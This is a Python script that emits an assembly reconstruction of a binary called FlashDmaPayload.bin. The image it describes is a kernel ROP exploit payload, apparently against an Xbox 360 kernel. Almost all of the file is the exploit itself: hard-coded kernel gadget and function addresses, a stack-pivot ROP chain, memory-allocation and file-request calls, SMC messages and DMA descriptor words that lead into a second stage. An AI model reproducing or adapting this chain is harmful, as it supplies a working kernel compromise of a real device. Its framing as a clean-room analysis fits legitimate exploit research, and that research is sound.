#!/usr/bin/env python3
"""Emit the lossless, sparse assembly reconstruction of FlashDmaPayload.bin."""

from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
OUTPUT = ROOT / "analysis/reconstruction/FlashDmaPayload.reconstructed.S"

# Non-zero big-endian words recovered from the immutable 16 KiB image.  The
# 0x1600-0x17ff scratch sector is represented separately as a fill directive.
WORDS = {
    0x01F0: "FLASH_DMA_BASE + 0x200", 0x01F8: "KeSetCurrentStackPointers",
    0x0250: "CF_R6", 0x0254: "CF_R6", 0x0258: "CF_R5", 0x025C: "CF_R5",
    0x0260: "CF_R4", 0x0264: "CF_R4", 0x0274: "FLASH_DMA_BASE + 0xdf0", 0x0278: "stack_pivot_entry",
    0x02D0: "CF_R6", 0x02D4: "CF_R6", 0x02D8: "CF_R5", 0x02DC: "CF_R5",
    0x02E0: "CF_R4", 0x02E4: "CF_R4", 0x02F4: "FLASH_DMA_BASE + 0xde4", 0x02F8: "stack_pivot_entry",
    0x0350: "CF_R6", 0x0354: "CF_R6", 0x0358: "CF_R5", 0x035C: "CF_R5",
    0x0360: "CF_R4", 0x0364: "CF_R4", 0x0368: "CF_R3", 0x036C: "CF_R3",
    0x0370: "CF_R3_DEFAULT", 0x0374: "CF_R3_DEFAULT", 0x0378: "restgprlr_31",
    0x03D4: "restgprlr_31", 0x03D8: "mr_r31_to_r11",
    0x0438: "CF_R3", 0x043C: "CF_R3", 0x0440: "CF_R3_DEFAULT", 0x0444: "CF_R3_DEFAULT", 0x0448: "restgprlr_25",
    0x04AC: "2", 0x04B4: "0x0007c000", 0x04BC: "4", 0x04C4: "0x11",
    0x04C8: "CF_R3", 0x04CC: "CF_R3", 0x04D4: "MmSystemPfnRegion", 0x04D8: "call_func_preload",
    0x0534: "MiAllocateMappedMemory", 0x0538: "call_func_dispatch",
    0x0594: "FLASH_DMA_BASE + 0xe3c", 0x0598: "mr_r31_to_r3",
    0x0604: "lwz_r3_off_r3", 0x0608: "call_func_dispatch",
    0x0664: "FLASH_DMA_BASE + 0xe68", 0x0668: "stw_r3",
    0x06C4: "restgprlr_31", 0x06C8: "mr_r31_to_r11",
    0x0728: "CF_R3", 0x072C: "CF_R3", 0x0730: "CF_R3_DEFAULT", 0x0734: "CF_R3_DEFAULT", 0x0738: "restgprlr_29",
    0x0794: "0x00000bc4", 0x0798: "CF_R3", 0x079C: "CF_R3", 0x07A0: "CF_R3_DEFAULT", 0x07A4: "CF_R3_DEFAULT", 0x07A8: "call_func_preload + 0x10",
    0x0804: "0x801c7f80", 0x0808: "mr_r31_to_r11",
    0x0868: "CF_R3", 0x086C: "CF_R3", 0x0874: "load_add_store_r3_r4_on_r11", 0x0878: "call_func_dispatch",
    0x08D4: "0x801a614c", 0x08D8: "mr_r31_to_r3",
    0x0944: "lwz_r11_off_r3", 0x0948: "call_func_dispatch",
    0x09A4: "FLASH_DMA_BASE + 0xe38", 0x09A8: "mr_r31_to_r3",
    0x0A14: "lwz_r3_off_r3", 0x0A18: "call_func_dispatch",
    0x0A74: "stw_r11_on_r3", 0x0A78: "call_func_dispatch",
    0x0AD4: "restgprlr_31", 0x0AD8: "mr_r31_to_r11",
    0x0B38: "CF_R3", 0x0B3C: "CF_R3", 0x0B40: "CF_R3_DEFAULT", 0x0B44: "CF_R3_DEFAULT", 0x0B48: "restgprlr_25",
    0x0BA0: "CF_R8", 0x0BA4: "CF_R8", 0x0BAC: "FLASH_DMA_BASE + 0xe60", 0x0BB4: "0x0007c000",
    0x0BBC: "STAGE2_ROP_BASE", 0x0BC4: "0x41414141", 0x0BC8: "CF_R3", 0x0BCC: "CF_R3",
    0x0BD4: "2", 0x0BD8: "call_func_preload",
    0x0C34: "IoSynchronousFsdRequest", 0x0C38: "call_func_dispatch",
    0x0C94: "restgprlr_31", 0x0C98: "mr_r31_to_r11",
    0x0CF8: "CF_R3", 0x0CFC: "CF_R3", 0x0D00: "CF_R3_DEFAULT", 0x0D04: "CF_R3_DEFAULT", 0x0D08: "restgprlr_25",
    0x0D60: "CF_R8", 0x0D64: "CF_R8", 0x0D6C: "STAGE2_ROP_BASE", 0x0D74: "0x7a09c000",
    0x0D78: "CF_R5", 0x0D7C: "CF_R5", 0x0D84: "STAGE2_ROP_BASE", 0x0D88: "CF_R3", 0x0D8C: "CF_R3",
    0x0D94: "STAGE2_ROP_BASE + 0x2000", 0x0D98: "call_func_preload",
    0x0DF4: "KeSetCurrentStackPointers", 0x0DF8: "call_func_dispatch",
    0x0E00: "FLASH_DMA_BASE + 0xe30", 0x0E08: "HalSendSMCMessage", 0x0E0C: "0x00004e20",
    0x0E14: "KeStallExecutionProcessor", 0x0E18: "FLASH_DMA_BASE + 0xe40",
    0x0E20: "HalSendSMCMessage", 0x0E24: "FLASH_DMA_BASE + 0xe50",
    0x0E2C: "HalSendSMCMessage", 0x0E30: "0x99ffff00", 0x0E40: "0xa0010000",
    0x0E50: "0xa0000000", 0x0E64: "0x00004000", 0x0E6C: "FLASH_DMA_BASE",
    0x1400: "0x00b11c00", 0x1404: "0x20000000", 0x1408: "0x20b11c00",
    0x140C: "0xc0010000", 0x1410: "0x40388700", 0x1414: "0x20000080",
}

LABELS = {
    0x01F0: "entry_stack_record", 0x0250: "rop_chain", 0x0DE4: "return_stack_record",
    0x0E00: "smc_and_dma_control_data", 0x1400: "dma_descriptor_words", 0x1600: "scratch_sector",
}


def main() -> None:
    lines = [
        "/* Lossless clean-room reconstruction of Flash/FlashDmaPayload.bin.",
        " * Sparse 17559-kernel ROP/data image; it contains no sequential PPC code.",
        " */", ".section .text", ".balign 4", ".set FLASH_DMA_BASE, 0x801ca000",
        ".set STAGE2_ROP_BASE, 0x7a020000", ".set CF_R6, 0x27272727",
        ".set CF_R5, 0x28282828", ".set CF_R4, 0x29292929", ".set CF_R3, 0x30303030",
        ".set CF_R3_DEFAULT, 0x31313131", ".set CF_R8, 0x25252525",
        ".set MiAllocateMappedMemory, 0x80080d28", ".set MmSystemPfnRegion, 0x80170880",
        ".set KeSetCurrentStackPointers, 0x80075e70", ".set HalSendSMCMessage, 0x80067f48",
        ".set KeStallExecutionProcessor, 0x80073484", ".set IoSynchronousFsdRequest, 0x8006b928",
        ".set restgprlr_25, 0x80061b70", ".set restgprlr_29, 0x800619b4", ".set restgprlr_31, 0x800664b0",
        ".set stw_r3, 0x800d986c", ".set mr_r31_to_r3, 0x800661e4", ".set mr_r31_to_r11, 0x800c8748",
        ".set call_func_dispatch, 0x8007b0ac", ".set stack_pivot_entry, 0x800d27a0",
        ".set call_func_preload, 0x800f68cc", ".set load_add_store_r3_r4_on_r11, 0x80129b7c",
        ".set lwz_r3_off_r3, 0x80130f60", ".set lwz_r11_off_r3, 0x80131e38", ".set stw_r11_on_r3, 0x800c6690", "",
    ]
    for offset in sorted(WORDS):
        if offset in LABELS:
            lines += [f".org 0x{offset:04x}", f"{LABELS[offset]}:"]
        else:
            lines.append(f".org 0x{offset:04x}")
        lines.append(f"    .long {WORDS[offset]}")
    lines += [".org 0x1600", "scratch_sector:", "    .fill 128, 4, 0x41414141", ".org 0x4000", "payload_end:", ""]
    OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT.write_text("\n".join(lines), encoding="utf-8")
    print(OUTPUT.relative_to(ROOT))


if __name__ == "__main__":
    main()
